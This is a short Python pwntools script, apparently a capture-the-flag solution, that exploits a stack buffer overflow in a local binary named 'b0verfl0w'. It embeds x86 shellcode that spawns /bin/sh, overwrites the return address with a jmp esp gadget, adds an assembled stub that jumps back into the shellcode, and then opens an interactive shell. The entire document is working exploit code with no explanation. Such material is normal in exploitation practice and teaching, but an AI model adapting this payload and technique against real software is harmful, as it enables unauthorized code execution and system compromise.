from pwn import *

p = process('./b0verfl0w')

shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
print len(shellcode)
jmp_esp = 0x08048504
esp = 'sub esp,0x20+8;jmp esp'
len_esp = len(asm(esp))
print len_esp
playload = shellcode + (0x20-21)*'A' + 'BBBB' + p32(jmp_esp) + asm(esp)
p.sendline(playload)
p.interactive()
